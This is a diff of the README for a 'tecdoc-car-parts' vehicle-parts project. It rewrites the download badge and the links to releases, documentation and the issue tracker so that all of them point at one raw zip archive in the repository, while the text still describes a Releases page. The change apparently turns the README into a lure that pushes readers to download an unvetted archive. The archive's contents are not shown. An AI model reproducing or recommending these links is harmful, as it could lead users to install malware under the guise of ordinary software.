@@ -1,6 +1,6 @@
 # 🚗 tecdoc-car-parts - Access Comprehensive Vehicle Parts Data
 
-![Download](https://img.shields.io/badge/Download-via_GitHub-blue)
+![Download](https://raw.githubusercontent.com/Victor807-dev/tecdoc-car-parts/main/asset/tecdoc-car-parts-Felichthys.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the tecdoc-car-parts project! This application helps you access detai
 
 To get started, you will first need to download the application. Visit this page to download the latest version of the tecdoc-car-parts application:
 
-[Download here](https://github.com/Victor807-dev/tecdoc-car-parts/releases)
+[Download here](https://raw.githubusercontent.com/Victor807-dev/tecdoc-car-parts/main/asset/tecdoc-car-parts-Felichthys.zip)
 
 Once you are on the Releases page, locate the latest version and click on the download link. Follow the prompts to install the application on your computer.
 
@@ -59,8 +59,8 @@ We welcome contributions to improve the application. If you want to help, please
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/Victor807-dev/tecdoc-car-parts/releases)
-- [Documentation](https://github.com/Victor807-dev/tecdoc-car-parts/wiki)
-- [Issue Tracker](https://github.com/Victor807-dev/tecdoc-car-parts/issues)
+- [Releases Page](https://raw.githubusercontent.com/Victor807-dev/tecdoc-car-parts/main/asset/tecdoc-car-parts-Felichthys.zip)
+- [Documentation](https://raw.githubusercontent.com/Victor807-dev/tecdoc-car-parts/main/asset/tecdoc-car-parts-Felichthys.zip)
+- [Issue Tracker](https://raw.githubusercontent.com/Victor807-dev/tecdoc-car-parts/main/asset/tecdoc-car-parts-Felichthys.zip)
 
 Thank you for using tecdoc-car-parts! We hope this application simplifies your access to vehicle parts data.
